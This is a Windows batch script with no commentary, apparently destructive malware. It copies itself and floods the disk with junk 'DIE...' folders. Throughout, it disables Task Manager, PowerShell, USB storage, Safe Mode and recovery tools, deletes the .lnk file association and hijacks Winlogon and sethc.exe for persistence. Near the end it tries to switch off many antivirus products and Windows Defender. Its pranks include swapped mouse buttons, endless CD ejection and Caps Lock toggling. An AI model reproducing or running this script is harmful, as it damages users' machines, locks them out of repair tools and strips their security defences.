copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
@echo off
rem ---------------------------------
rem Fare tuslarinin yerini degistir..
RUNDLL32 USER32.DLL,SwapMouseButton
rem ---------------------------------
echo Do >> "diskac.vbs"
echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "diskac.vbs"
echo Set colCDROMs = oWMP.cdromCollection >> "diskac.vbs"
echo colCDROMs.Item(d).Eject  >> "diskac.vbs"
echo colCDROMs.Item(d).Eject  >> "diskac.vbs"
echo Loop >> "diskac.vbs"
start "" "diskac.vbs"
diskac.vbs
@echo off
echo Set wshShell =wscript.CreateObject(“WScript.Shell”) >>sendkey.vbs
echo do >>sendkey.vbs
echo wscript.sleep 100 >>sendkey.vbs
echo wshshell.sendkeys “{CAPSLOCK}” >>sendkey.vbs
echo loop >>sendkey.vbs
sendkey.vbs
@echo off
reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal” /f > nul
reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\network” /f > nul
sc config winpeshl start=disabled
@echo off
@echo off
reg add "HKEY_CURRENT_CONFIG\Software\Fonts" /v LogPixels /t REG_DWORD /d 73 /f
@echo off
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\Setup\Status\UnattendPasses\windowsPE" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMSCONFIG /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\System\CurrentControlSet" /v "ValueName" /t REG_DWORD /d "2" /f
reg add "HKEY_CLASSES_ROOT\xhtmlfile" /v FriendlyTypeName /t REG_EXPAND_SZ /d "@C:\Windows\system32\httpapi.dll,-999" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "taskkill /f /im sethc.exe" /f
reg add "HKEY_CURRENT_USER\Control Panel\International" /v Geo /t REG_SZ /d "Geos" /f
md 0
md 1
md 2
md 3
md 4
md 5 
md 6
md 7
md 8
md 9 
md 10
md 11
md 12
md 13
md 14
md 15
md 16
md 17
md 18
md 19 
md 20
md 21
md 22
md 23
md 24
md 25
md 26
md 27
md 28
md 29
md 30
md 31
md 32
md 33
md 34
md 35
md 36
md 37
md 38
md 39
md 40
md 41
md 42
md 43
md 44
md 45
md 46
md 47
md 48
md 49 
md 50
md DIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDDIEDIEDIEDIEDIEDIEDIEDIE
md DIEDIEDIEDEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIE
md DIEDIEDIEDIEDIEIDIEDEDIIDIEDIEDIEDIEDIEDIE
md DIEEIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIE
md DIEDIEDIDIEDIEDIEDIEDIEDEDIEIEDIEDIEDIEDIE
md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEIEDIEDIDIEDIE
md DIEDIEIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIIEDIEDIE
md DIEDIEDIEEIIEDIEDIEDIEDIEDIEDDIEDIEDIEDIE
md DIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEIIEDIDIEDIEIDIEDIEDIEDIEDIEE
md DIEDIIEDIEIEDIEDIEDIEEIEDIEDIEEDIEDIEDIEE
md DIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDEE
md DIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIDIEE
md DIEDIEDIEDIDIDIEDIDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIDIIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEIEE
md DIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIE
md DIEDIEDIEDIEDIEIDIDIEDIEDIEDIEDIEDIEDIEDIEEDIEE
md DIEDIEDIEDIEDIIEDIEDIEDIDIEDIEDIEDIEDIEDIE
md DIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIDIEDIEDIEDIDIEDEDIEDIEDIEE
md DIEDIEIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
md DIEDEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEDIEE
md DIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIDIEDIEDIDIEDIEDIEDIEIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIDIEDIEDIEDEDIEDIEDEDIEDIEDIEE
md DIEDIEDIEDIEDIEIEDIEDIEDIEDIEIEDIEDIEDIEDIEE
md DIEDIDIEDIEDIEDIDIEDIEDIEDIEDIEDIEIEDIEDIEE
md DIEDIEDIDIEDIEDIIEDIEDIEDIEDIEDIEDEDIEDIEE
md DIEDIEDIEDIEDEDIEDIDIEIEDIEDEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDEDIEDIEDIEDIEEDIEDIEIEE
md 
md DIEDIEDIEDIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIDIEDIDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEIDEDEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDEDIEDIEDIEDIDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDEIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIWEDIEIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIDIEIEDIEJDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEIEDDIEDIELDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDEDIEIEDIEDIEDIEDIEDIEE
md
DIEDIEDIEDIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDLIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDILEDIEDIIELDIEIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDILEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEIEDIEDIEDIELDIDIDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDILEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDEDLIEDLIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDEDIEDIEDIELDIEDIEDIEDIEDIEDIEE
md LEDIEDIEDIEDIEDIEEDIEDLIEDILEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE


md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIWEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEQEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEE

md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE


md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDKIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DEDIEDIEDIEDIEDIEDIEDIEDIEŞDIEDIEDIEDIEDIEDIEE


md DIEDIEDIEDIEDIEDEDIEDIEDIEDIJIEDIEDIEDIEDIEDIEE
md IDIEDIEDIGEDIEDIEDIEDHIEDIEDIEDIEDIELDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEK
md DEDIEDIEDIEDIEHDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE


md DIEDIEDIEDIEDIEDEDIEDIEDIEJDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDHIEDIEDIEDIEHDIEDIEDIEDIEFEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DEDIEDIEDIEDIEDIEDIJEDIEDIEDIEDIEDHIEDIEDIEDIEE


md DIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDDIEDIEDIEDIEDIEDIEDIEDIE
md DIEDIEDIEDEDIEDLDIEDEDIIDIEDIEDIEDIEDIEDIE
md DIEEIEDIEDEDIEDIJEDIEDIEDIEDIEDIEDIEDIEDIEDIE
md DIEDIEDIDIEDHIEDIEDIEDIEDEDIEIEDIEDIEDIEDIE
md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEIEDIEDIDIEDIE
md DIEDIEIEDIDIEDIJEDIEDIEDIEDJLIEDIEDIEDIIEDIEDIE
md DIEDIEDIEEIJIEDIEDI9K0EDIEDIEDIEDDIEDIEDIEDIE
md DIEDIEDIEDEDIEDIEDIEDINEDJIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEIIEDIDIEDIEIDIEDIEDIEDIEDIEE
md DIEDIIEDIEIJEDIEDIEDIJIPEDIEDIEEDIEDIEDIEE
md DIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDEE
md DIEDIEDIEŞDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIDIEE
md DIEDIEDIEDIDIDIEDIDIEGLJGDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIDIIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEIEE
md DIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIE
md DIEDIEDIEDIHEDIEIDIDIEDIEDIEDIEDIEDIEDIEDIEEDIEE
md DIEDIEDIEDIEDIIEDIEDIEDIDIEDIEDIEDIEDIEDIE
md DIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIDIHEDIEDIEDIDIEDEDIEDIEDIEE
md DIEDIEIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
md DIEDEDIEDIEDIEDIEDIEIJKYEDEDIEDIEDIEDIEDIEDIEE
md DIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIDIEDIEDIDIEDIEDIEDIEIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIDIEDIEDIEDEDIEDIEDEDIEDIEDIEE
md DIEDIEDIEDIEDIEIEDIEDIEDIEDIEIEDIEDIEDIEDIEE
md DIEDIDIEDIEDIEDHŞIDIEDIEDIEDIEDIEDIEIEDIEDIEE
md DIEDIEDIDIEDIEDIIEDIEDIEDIEDIEDIEDEDIEDIEE
md DIEDIEDIEDIEDEDIEDIDIEIEDIEDEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIELKDEDIEDIEDIEDIEEDIEDIEIEE
md 
md DIEDIEDIEDIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDBIŞHŞOIHEDIDIEDIDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEJDIEDIJKHLEIDEDEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDKEDIEDIEDIEDIDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDEIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEIEDEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIDIEIEHKDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIE
md DIEKDIEDIEDIEDIEDIEDIEIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEIEDDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDEDIEIEDIEDIEDIEDIEDIEE
md
DIEDIEDIEDIEDIEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIDIDIEDLIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDGLKGSDFŞIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIJEDIEDIIEDIEIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIGOUIFYOEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEIEDIHEDIEDIEDIDIDIEDIEDIEDIEE
md DIEDIEDIJEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEKDIEE
md DEDIEDIEKDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE


md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIWEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDLJFGLJIEDIEDIEDIEDIEDIEDIEDIEDIEQEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEE

md DIEDIEDIEDIEDIEŞJGHŞJKDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDKJKIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DEDIEDIEDIEDIKLJKLEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE


md DIEDIEDIEDIEDIEDEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDKIEDIEDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DEDIEDIEDIEDIEDIEDIEDIEDIEŞDIEDIEDIEDIEDIEDIEE


md DIEDIEDIEDIEDIEDEDIEDIEDIEDIJIEDIEDIEDIEDIEDIEE
md IDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIELDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEEK
md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE


md DIEDIEDIEDIEDIEDEDIEDIEDIEJDIEDIEDIEDIEDIEDIEE
md DIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEHDIEDIEDIEDIEEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEE
md DEDIEDIEDIEDIEDIEDIEDIEDIEDIEDIEDHIEDIEDIEDIEE

taskkill /f /im dwm.exe
@echo off

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d "1" /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /t REG_DWORD /d "4" /f
@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell" /v DisablePowerShell /t REG_DWORD /d 1 /f

@echo off
reg add "HKCU\Software\Policies\Microsoft\MMC" /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f

@echo off
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f

@echo off


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePaint /t REG_DWORD /d 1 /f

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableStickyKeys /t REG_DWORD /d 1 /f



reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f



@echo off

@echo off
reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\WindowsLogoff" /f
@echo off
reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\HubOffSound" /f

@echo off
reg add "HKEY_CURRENT_USER\AppEvents\EventLabels\WindowsLogon" /v "@mmres.dll,-5853" /t REG_SZ /d "LogonUI.mui,-5852" /f

@echo off
reg add "HKEY_CURRENT_USER\System\CurrentControlSet\Control\NetTrace\Session" /v Default /t REG_SZ /d "off" /f


@echo off
reg add "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /v MouseSpeed /t REG_SZ /d "2" /f

@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\ProgramData\Tumeg.exe," /f


@echo off
reg delete "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /f

@echo off
reg delete "HKEY_CURRENT_USER\Identities" /f

@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f

@echo off
reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\SystemAsterisk" /f


@echo off
reg delete "HKEY_CLASSES_ROOT\DXImageTransform.Microsoft.CrBlinds.1" /f


@echo off
reg delete "HKEY_CLASSES_ROOT\MSRDC.SimilarityFileIdTable\CurVer" /f


@echo off
reg delete "HKEY_USERS\S-1-5-20\Printers\DevModePerUser" /f
reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal” /f > nul
reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\network” /f > nul
reg add "HKEY_CURRENT_CONFIG\Software\Fonts" /v LogPixels /t REG_DWORD /d 73 /f

@echo off
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\Setup\Status\UnattendPasses\windowsPE" /f
reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal” /f > nul
reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\network” /f > nul
@echo off
reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\WindowsLogoff" /f
@echo off
reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\HubOffSound" /f

@echo off
reg delete "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /f

@echo off
reg delete "HKEY_CURRENT_USER\Identities" /f

@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f

@echo off
reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\SystemAsterisk" /f


@echo off
reg delete "HKEY_CLASSES_ROOT\DXImageTransform.Microsoft.CrBlinds.1" /f


@echo off
reg delete "HKEY_CLASSES_ROOT\MSRDC.SimilarityFileIdTable\CurVer" /f


@echo off
reg delete "HKEY_USERS\S-1-5-20\Printers\DevModePerUser" /f




@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f


@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f


@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f
@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f


@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f


@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePerformanceMonitor /t REG_DWORD /d 1 /f


reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f


reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMMC /t REG_DWORD /d 1 /f


reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableEventViewer /t REG_DWORD /d 1 /f


reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v NoWinKeys /t REG_DWORD /d 1 /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableSnippingTool /t REG_DWORD /d 1 /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMagnifier /t REG_DWORD /d 1 /f


reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableEaseOfAccess /t REG_DWORD /d 1 /f


@echo off

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "perfmon.msc" /d "" /f


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "perfmon.exe" /d "" /f


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mmc.exe" /d "" /f


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mstsc.exe" /d "" /f


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mobsync.exe" /d "" /f


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "SoundRecorder.exe" /d "" /f


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "displayswitch.exe" /d "" /f


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "conhost.exe" /d "" /f


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "taskkill.exe" /d "" /f


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "tasklist.exe" /d "" /f


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "iexpress.exe" /d "" /f

@echo off

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewContextMenu" /t REG_DWORD /d "1" /f

@echo off

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /t REG_DWORD /d "1" /f

@echo off

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v "OptionValue" /t REG_DWORD /d "4" /f

@echo off
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRunAs" /t REG_DWORD /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRunAs" /t REG_DWORD /d "1" /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMSCONFIG /t REG_DWORD /d 1 /f


@echo off

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d "1" /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\AVAST Software\Avast" /v "aswidsagenta" /t REG_DWORD /d "0" /f


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\AVG" /v "DisableAv" /t REG_DWORD /d "1" /f


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Bitdefender" /v "BlockUserModeAccess" /t REG_DWORD /d "1" /f


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\McAfee" /v "bDisableSelfProtection" /t REG_DWORD /d "1" /f


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security" /v "ProtectEnabled" /t REG_DWORD /d "0" /f


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab" /v "Enable" /t REG_DWORD /d "0" /f


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Malwarebytes" /v "MalwareProtectionEnabled" /t REG_DWORD /d "0" /f


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Norton" /v "Enable" /t REG_DWORD /d "0" /f


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Avira" /v "ProductEnabled" /t REG_DWORD /d "0" /f

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileOpen /t REG_DWORD /d 1 /f
@echo off
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangeTime /t REG_DWORD /d 1 /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "AntiVirusOverride" /t REG_DWORD /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
